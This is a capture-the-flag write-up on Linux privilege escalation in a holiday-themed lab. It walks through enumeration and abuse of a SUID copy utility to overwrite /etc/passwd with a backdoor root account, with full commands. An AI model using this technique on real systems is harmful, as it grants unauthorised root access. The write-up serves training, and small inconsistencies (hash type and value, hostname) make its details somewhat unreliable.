# Linux PrivEsc

```
In a digital winter wonderland we play,
Where elves and bytes in harmony lay.
This festive terminal is clear and bright,
Escalate privileges, and bring forth the light.

Start in the land of bash, where you reside,
But to win this game, to root you must glide.
Climb the ladder, permissions to seize,
Unravel the mystery, with elegance and ease.

There lies a gift, in the root's domain,
An executable file to run, the prize you'll obtain.
The game is won, the challenge complete,
Merry Christmas to all, and to all, a root feat!

* Find a method to escalate privileges inside this terminal and then run the binary in /root *
```

Begin navigating our environment to get a better situational awareness.

```console
elf@8229518634e7:~$ id
uid=1000(elf) gid=1000(elf) groups=1000(elf)
elf@8229518634e7:~$ hostname
8229518634e7
elf@8229518634e7:~$ pwd
/home/elf
elf@8229518634e7:~$ ls -al
total 28
drwxr-xr-x 1 elf  elf  4096 Dec  2 22:17 .
drwxr-xr-x 1 root root 4096 Dec  2 22:16 ..
-rw-r--r-- 1 elf  elf   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 elf  elf  3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 elf  elf   807 Feb 25  2020 .profile
-rw-r--r-- 1 root root  628 Nov 27 17:07 HELP
elf@8229518634e7:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
elf:x:1000:1000::/home/elf:/bin/sh
```

One of the first commands I always run is `sudo -l`.

```console
elf@8229518634e7:~$ sudo -l
bash: sudo: command not found
```

Next, I check for any running system processes of interest.

```console
elf@8229518634e7:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf            1  0.0  0.0   4116  3488 pts/0    Ss   19:28   0:00 /bin/bash
elf           24  0.0  0.0   5900  2836 pts/0    R+   19:33   0:00 ps aux
```

Check for upgradeable components.

```console
elf@8229518634e7:~$ apt list --upgradeable
Listing... Done
```

Find all writable directories.

```console
elf@8229518634e7:~$ find / -writable -type d 2>/dev/null
/tmp
/var/tmp
/home/elf
/dev/shm
/dev/mqueue
/proc/29/task/29/fd
/proc/29/fd
/proc/29/map_files
/run/lock
```

Check what Cron jobs are running.

```console
elf@8229518634e7:~$ ls -alh /etc/cron*
/etc/cron.d:
total 12K
drwxr-xr-x 2 root root 4.0K Nov 28 02:06 .
drwxr-xr-x 1 root root 4.0K Dec 31 19:28 ..
-rw-r--r-- 1 root root  201 Feb 14  2020 e2scrub_all

/etc/cron.daily:
total 16K
drwxr-xr-x 2 root root 4.0K Nov 28 02:06 .
drwxr-xr-x 1 root root 4.0K Dec 31 19:28 ..
-rwxr-xr-x 1 root root 1.5K Apr  9  2020 apt-compat
-rwxr-xr-x 1 root root 1.2K Sep  5  2019 dpkg
```

Check for any sensitive information hardcoded as environment variables.

```console
elf@8229518634e7:~$ env
HOSTNAME=8229518634e7
RESOURCE_ID=5967a20b-5b82-411d-a9fc-c9d07c84b88d
PWD=/home/elf
HOME=/home/elf
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
HHCUSERNAME=Humming5607
AREA=imtostrichsaloon
TERM=xterm
TOKENS=
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LOCATION=7,8
_=/usr/bin/env
```

Check for any SUID or SGID-marked binaries.

```console
elf@8229518634e7:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
elf@8229518634e7:~$ find / -perm -g=s -type f 2>/dev/null
/usr/bin/expiry
/usr/bin/wall
/usr/bin/chage
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
```

The binary `/usr/bin/simplecopy` stands out to me. Check its `--help` menu.

```console
elf@8229518634e7:~$ simplecopy --help
Usage: simplecopy <source> <destination>
```

The utility seems to copy an item to a destination. If we can overwrite files, then we may be able to escalate privileges by overwriting the contents of `/etc/passwd`. Validate that we can overwrite files by creating two test files and using the `simplecopy` utility on them.

```console
elf@8229518634e7:~$ echo 'test 1' > test1.txt
elf@8229518634e7:~$ echo 'test 2' > test2.txt
elf@8229518634e7:~$ simplecopy test2.txt test1.txt 
elf@8229518634e7:~$ cat test1.txt 
test 2
```

The overwrite seems to work. Back on kali, use the `openssl` utility to generate a MD5 hash, which is a supported hash algorithm by `/etc/passwd`. If this were a real engagement, we should use a strong password, since creating a backdoor account with a very weak password would introduce another critical vulnerability to the system. For this challenge however, I generated a hash for the password *yougotpwnedithappens*.

```console
kali@kali:~$ mkpasswd -m descrypt
Password: 
ECORIxCVacJMw
```

Back on the target machine, create a copy of `/etc/passwd`, append the new line to `/etc/passwd` that adds a new superuser with our generated password, and overwrite the contents of `/etc/passwd`.

```console
elf@85bdf04c4d99:~$ cat /etc/passwd > /tmp/passwd.bak
elf@85bdf04c4d99:~$ echo "root2:PHSm1daAPUIcg:0:0:root:/root:/bin/bash" > /tmp/fakepasswd
elf@85bdf04c4d99:~$ simplecopy /tmp/fakepasswd /etc/passwd
elf@85bdf04c4d99:~$ su root2
Password: 
root2@85bdf04c4d99:/home/elf# id
uid=0(root2) gid=0(root) groups=0(root)
```

We are now running in a shell as *root*. Move to the directory `/root` and run the binary to complete the lab.

```console
root2@85bdf04c4d99:/home/elf# cd /root
root2@85bdf04c4d99:~# ls -al
total 620
drwx------ 1 root2 root   4096 Dec 31 20:58 .
drwxr-xr-x 1 root2 root   4096 Dec 31 20:05 ..
-rw------- 1 root2 root      5 Dec 31 20:58 .bash_history
-rw-r--r-- 1 root2 root   3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root2 root    161 Dec  5  2019 .profile
-rws------ 1 root2 root 612560 Nov  9 21:29 runmetoanswer
root2@85bdf04c4d99:~# ./runmetoanswer 
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```

